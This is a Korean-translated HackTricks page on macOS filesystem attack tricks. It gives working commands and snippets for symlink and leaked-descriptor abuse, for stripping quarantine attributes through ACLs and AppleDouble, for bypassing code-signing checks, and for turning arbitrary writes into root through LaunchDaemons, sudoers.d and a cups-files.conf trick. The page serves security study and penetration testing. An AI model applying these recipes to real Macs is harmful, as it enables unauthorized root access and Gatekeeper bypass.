# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## POSIX permissions 조합

**directory**의 permissions:

- **read** - directory 항목을 **enumerate**할 수 있음
- **write** - directory 내 **files**를 **delete/write**할 수 있고, **empty folders**를 **delete**할 수 있음
- 하지만 해당 폴더에 대한 write permissions가 없다면 **non-empty folders**를 **delete/modify**할 수 없음
- 소유자가 아니라면 **folder**의 이름을 **modify**할 수 없음
- **execute** - directory를 **traverse**할 수 있음 - 이 권한이 없으면 내부의 파일이나 하위 directory에 접근할 수 없음

### Dangerous Combinations

**root가 소유한 file/folder를 overwrite하는 방법**:

- 경로 내 하나의 parent **directory owner**가 해당 user임
- 경로 내 하나의 parent **directory owner**가 **write access**를 가진 **users group**임
- 한 **users group**이 **file**에 대해 **write** access를 가짐

이전 조합 중 하나라도 해당하면, attacker는 예상 경로에 **sym/hard link**를 **inject**하여 privileged arbitrary write를 얻을 수 있음.

### Folder root R+X Special case

**root만 R+X access**를 가진 **directory**에 files가 있다면, 해당 files는 다른 누구도 **access**할 수 없음. 따라서 user가 읽을 수 있지만 해당 **restriction** 때문에 읽을 수 없는 **file**을 이 folder에서 **different one**으로 **move**할 수 있게 하는 vulnerability는, 이 files를 읽는 데 악용될 수 있음.

Example in: [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions)

## Symbolic Link / Hard Link

### Permissive file/folder

privileged process가 **lower privileged user**에 의해 **controlled**되거나, lower privileged user가 **previously created**할 수 있는 **file**에 data를 쓰는 경우, 해당 user는 Symbolic 또는 Hard link를 통해 이를 다른 **file**을 가리키도록 만들 수 있으며 privileged process는 그 file에 data를 쓰게 됨.

attacker가 **arbitrary write를 abuse하여 privileges를 escalate**할 수 있는 다른 sections를 확인할 것.

### Open `O_NOFOLLOW`

[`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html)에 따르면: *"`O_NOFOLLOW`가 mask에 사용되었고 `open()`에 전달된 target file이 symbolic link라면 `open()`은 fail함."* **final** component만 확인되며 — 모든 **intermediate** component는 여전히 resolve되고 follow됨. 따라서 `O_NOFOLLOW`로 write를 "protected"한 developer도 target path의 **parent directory** 중 하나에 symlink를 심어 공격할 수 있음.

동일한 man page에는 이 gap을 실제로 차단하는 flags가 설명되어 있음:

- **`O_NOFOLLOW_ANY`** — *"path passed to `open()`의 ... 어떤 component라도 symbolic link라면 `open()`은 fail함."*
- **`O_RESOLVE_BENEATH`** — *"지정된 path resolution이 fd와 연결된 directory를 벗어나면 `openat()`은 fail함."*

그렇지 않다면, 이미 validation을 완료한 directory FD를 기준으로 한 `openat()` 또는 `realpath()` + re-validation이 mid-path symlink swaps를 방지하는 나머지 방법임.

## .fileloc

**`.fileloc` extension**을 가진 Files는 다른 applications 또는 binaries를 가리킬 수 있으므로, 해당 파일을 open하면 그 application/binary가 실행됨.\
Example:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## 파일 디스크립터

### Leak FD (`O_CLOEXEC` 없음)

`open` 호출에 `O_CLOEXEC` 플래그가 없으면 파일 디스크립터가 child process에 상속됩니다. 따라서 privileged process가 privileged file을 열고 attacker가 제어하는 process를 실행하면, attacker는 **privileged file에 대한 FD를 상속**하게 됩니다.

대표적인 예는 **OS X 10.10의 `DYLD_PRINT_TO_FILE` LPE**입니다 ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):

- `dyld`는 해당 변수가 `processDyldEnvironmentVariable()` 외부에서 파싱되었기 때문에 **restricted (suid root) binaries**에서도 `DYLD_PRINT_TO_FILE=/path`를 허용했습니다.
- `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`를 실행했으므로 **임의의 경로에 root 소유 파일을 생성**했습니다.
- FD가 **절대 닫히지 않았고 close-on-exec 플래그도 없었기 때문에**, suid binary의 모든 child는 **root 소유 파일에 대한 writable FD**를 상속했습니다.
- 예를 들어 `DYLD_PRINT_TO_FILE=/etc/target suid_binary`를 실행한 다음 child에서 상속된 FD 번호를 읽으면 임의의 root 소유 파일 쓰기가 가능했습니다. 또한 `fcntl(fd, F_SETFL, 0)`을 사용하면 `O_APPEND`를 해제하여 append 대신 overwrite할 수도 있었습니다.

이와 동일한 형태는 privileged process가 사용자가 제어하는 대상을 `exec`하기 **전에** 파일을 열 때마다 나타납니다(helper tools, `$EDITOR`를 통해 호출되는 `crontab` 스타일 editor, env-var 경로에서 열리는 log/debug files 등). 다음을 사용하여 상속된 FD를 열거합니다:
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
`2`보다 크면서 직접 열 수 없는 파일을 가리키는 것은 무엇이든 arbitrary-write(또는 arbitrary-read) primitive입니다.

## quarantine xattrs tricks 피하기

### 제거하기
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

파일/폴더에 이 immutable attribute가 있으면 해당 파일/폴더에 xattr를 설정할 수 없습니다.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### xattr를 지원하지 않는 파일 시스템

macOS가 마운트할 수 있는 모든 파일 시스템이 **extended attributes**를 기본적으로 저장하는 것은 아닙니다. HFS+와 APFS는 지원하지만, **FAT32, exFAT 및 (대부분의) NFS 마운트는 지원하지 않습니다** — macOS는 `._<filename>`이라는 이름의 **AppleDouble** side file을 작성하여 이를 에뮬레이트합니다 ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).

이는 quarantine에 중요합니다. xattr은 동일한 volume에서 실제로 작성되고 **다시 읽힐 수 있는 경우에만** 유지되기 때문입니다:
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
볼륨을 나중에 `._` companion을 무시하는 경로에서 읽거나(companion이 제거/삭제된 경우), 파일은 **quarantine flag 없이** 도착합니다. 그리고 quarantine되지 않은 `.app`이면 App Sandbox를 escape하기에 충분합니다. 자세한 내용은 [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute)를 참고하세요.

### writeextattr ACL

이 ACL은 파일에 `xattrs`를 추가하는 것을 방지합니다.
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** 파일 형식은 ACE를 포함한 파일을 복사합니다.

[**source code**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html)에서 xattr 내부에 저장된 **`com.apple.acl.text`** ACL 텍스트 표현이 압축 해제된 파일에 ACL로 설정된다는 것을 확인할 수 있습니다. 따라서 다른 xattr이 파일에 기록되지 않도록 하는 ACL과 함께 애플리케이션을 **AppleDouble** 파일 형식의 zip 파일로 압축하면, 해당 애플리케이션에는 quarantine xattr이 설정되지 않습니다.

자세한 내용은 [**original report**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)를 확인하세요.

이를 재현하려면 먼저 올바른 acl 문자열을 가져와야 합니다:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(이 방법이 작동하더라도 sandbox가 먼저 quarantine xattr을 기록한다는 점에 유의하세요)

실제로 필요하지는 않지만, 만일을 위해 남겨 둡니다:


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Bypass signature checks

### Bypass platform binaries checks

일부 security check는 바이너리가 **platform binary**인지 확인합니다. 예를 들어 XPC service에 연결을 허용하기 위해서입니다. 그러나 https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/의 bypass 사례에서 설명했듯이, platform binary(예: /bin/ls)를 가져온 다음 환경 변수 `DYLD_INSERT_LIBRARIES`를 사용해 dyld를 통해 exploit을 주입하면 이 check를 bypass할 수 있습니다.

### Bypass flags `CS_REQUIRE_LV` and `CS_FORCED_LV`

실행 중인 바이너리가 다음과 같은 code를 사용해 자신의 flags를 수정하여 check를 bypass하는 것이 가능합니다:
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Bypass Code Signatures

Bundles에는 **`_CodeSignature/CodeResources`** 파일이 있으며, 이 파일에는 **bundle** 내 모든 **file**의 **hash**가 포함되어 있습니다. 또한 CodeResources의 hash도 **executable**에 **embedded**되어 있으므로, 이 역시 변경할 수 없습니다.

하지만 signature가 검사되지 않는 일부 파일이 있으며, 이러한 파일은 plist에 `omit` key가 지정되어 있습니다. 예:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
CLI에서 리소스의 서명을 계산할 수 있습니다:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## dmgs 마운트

사용자는 기존 폴더 위에도 직접 생성한 custom dmg를 마운트할 수 있습니다. 다음과 같이 custom 콘텐츠가 포함된 custom dmg 패키지를 생성할 수 있습니다:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
일반적으로 macOS는 `/usr/libexec/diskarbitrationd`에서 제공하는 `com.apple.DiskArbitrarion.diskarbitrariond` Mach service와 통신하여 disk를 mount합니다. LaunchDaemons plist file에 `-d` parameter를 추가하고 재시작하면 `/var/log/diskarbitrationd.log`에 logs가 저장됩니다.\
하지만 `hdik` 및 `hdiutil`과 같은 tools를 사용하여 `com.apple.driver.DiskImages` kext와 직접 통신할 수도 있습니다.

## Arbitrary Writes

### Periodic sh scripts

script가 **shell script**로 해석될 수 있다면 매일 trigger되는 **`/etc/periodic/daily/999.local`** shell script를 overwrite할 수 있습니다.

다음을 사용하여 이 script의 실행을 **fake**할 수 있습니다: **`sudo periodic daily`**

### Daemons

**`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**와 같은 임의의 **LaunchDaemon**을 작성하고, 다음과 같이 임의의 script를 실행하는 plist를 지정합니다:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Just generate the script `/Applications/Scripts/privesc.sh` with the **commands** you would like to run as root.

### Sudoers File

If you have **arbitrary write**, you could create a file inside the folder **`/etc/sudoers.d/`** granting yourself **sudo** privileges.

### PATH files

The file **`/etc/paths`** is one of the main places that populates the PATH env variable. You must be root to overwrite it, but if a script from **privileged process** is executing some **command without the full path**, you might be able to **hijack** it modifying this file.

You can also write files in **`/etc/paths.d`** to load new folders into the `PATH` env variable.

### cups-files.conf

This technique was used in [this writeup](https://www.kandji.io/blog/macos-audit-story-part1).

Create the file `/etc/cups/cups-files.conf` with the following content:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
그러면 권한이 777인 `/etc/sudoers.d/lpe` 파일이 생성됩니다. 끝부분의 불필요한 내용은 오류 로그 생성을 트리거하기 위한 것입니다.

그런 다음 `/etc/sudoers.d/lpe`에 `%staff ALL=(ALL) NOPASSWD:ALL`과 같이 privileges를 escalate하는 데 필요한 config를 작성합니다.

그런 다음 `/etc/cups/cups-files.conf`를 다시 수정하여 `LogFilePerm 700`을 지정하면, `cupsctl`을 호출할 때 새 sudoers 파일이 유효해집니다.

### Sandbox Escape

FS arbitrary write를 사용하여 macOS sandbox에서 탈출할 수 있습니다. 몇 가지 예시는 [macOS Auto Start](../../../../macos-auto-start-locations.md) 페이지를 확인하세요. 일반적인 방법 중 하나는 시작 시 command를 실행하는 Terminal preferences 파일을 `~/Library/Preferences/com.apple.Terminal.plist`에 작성한 다음 `open`을 사용하여 호출하는 것입니다.

## 다른 사용자로 writable files 생성

매우 일반적인 privesc primitive는 **권한이 있는 process가 사용자가 제어하는 directory에 file을 생성하도록 만들고**, 해당 file에 대한 **write access**를 계속 유지하는 것입니다. 이를 위해서는 두 가지 요소가 필요합니다.

1. 사용자가 소유한 directory(또는 **inheritable ACL**을 설정할 수 있는 directory). 이렇게 하면 내부에 생성되는 모든 항목이 사용자의 permissions를 상속합니다.
2. **어디에** file을 생성할지 지정할 수 있는 privileged/`suid` process. 일반적으로 debug/logging environment variable, config file 또는 helper의 XPC API를 통해 지정합니다.

생성된 file이 다른 사용자의 소유임에도 사용자가 쓸 수 있게 되는 이유는 **inheritable ACL** 때문입니다. `file_inherit` / `directory_inherit` inheritance flags는 [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html)에 문서화되어 있습니다.
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
이제 권한이 있는 프로세스가 `$DIRNAME` 내부에 생성하는 모든 파일은 **사용자가 쓸 수 있습니다**. 해당 디렉터리가 나중에 **root로 실행되는 위치**(`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, LaunchDaemon 디렉터리 등)이기도 하다면, 이는 직접적인 root escalation입니다. 파일을 확보한 후 무엇을 작성해야 하는지는 위의 [Sudoers File](#sudoers-file) 및 [cups-files.conf](#cups-filesconf) 섹션을 참조하세요.

"env variable이 root 프로세스로 하여금 파일을 생성하게 만들고, FD가 사용자에게 leak되는" 전체 실행 예시는 위의 [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec)를 참조하세요.

## POSIX Shared Memory

**POSIX shared memory**를 사용하면 POSIX 호환 운영 체제의 프로세스들이 공통 메모리 영역에 액세스할 수 있으므로, 다른 inter-process communication 방식보다 빠른 통신이 가능합니다. `shm_open()`으로 shared memory object를 생성하거나 열고, `ftruncate()`로 크기를 설정한 다음, `mmap()`을 사용하여 프로세스의 주소 공간에 매핑합니다. 그러면 프로세스가 이 메모리 영역을 직접 읽고 쓸 수 있습니다. 동시 액세스를 관리하고 데이터 손상을 방지하기 위해 mutex 또는 semaphore와 같은 synchronization mechanism을 사용하는 경우가 많습니다. 마지막으로 프로세스는 `munmap()` 및 `close()`를 사용하여 shared memory의 매핑을 해제하고 닫으며, 필요에 따라 `shm_unlink()`로 memory object를 제거할 수 있습니다. 이 시스템은 여러 프로세스가 shared data에 빠르게 액세스해야 하는 환경에서 효율적이고 빠른 IPC를 구현하는 데 특히 효과적입니다.

<details>

<summary>Producer Code Example</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Consumer 코드 예제</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOSCguarded descriptors**는 사용자 애플리케이션의 **file descriptor operations** 안전성과 신뢰성을 향상하기 위해 macOS에 도입된 보안 기능입니다. 이러한 guarded descriptors는 file descriptor에 특정 제한 또는 "guards"를 연결하는 방법을 제공하며, 이는 kernel에 의해 적용됩니다.

이 기능은 **unauthorized file access** 또는 **race conditions**와 같은 특정 유형의 보안 취약점을 방지하는 데 특히 유용합니다. 이러한 취약점은 예를 들어 한 thread가 file description에 접근하여 **another vulnerable thread access over it**을 제공하거나, file descriptor가 취약한 child process에 **inherited**될 때 발생합니다. 이 기능과 관련된 일부 함수는 다음과 같습니다.

- `guarded_open_np`: guard를 사용하여 FD 열기
- `guarded_close_np`: FD 닫기
- `change_fdguard_np`: descriptor의 guard flags 변경 (guard protection 제거도 가능)

## References

- [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/)
- [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (close-on-exec가 설정되지 않은 leaked FD)
- [The Eclectic Light Company - Which file systems and cloud services preserve extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [`open(2)` man page](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [`chmod(1)` man page](https://keith.github.io/xcode-man-pages/chmod.1.html) (ACL inheritance flags)
- [Microsoft - Gatekeeper's Achilles heel: unearthing a macOS vulnerability](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

{{#include ../../../../banners/hacktricks-training.md}}
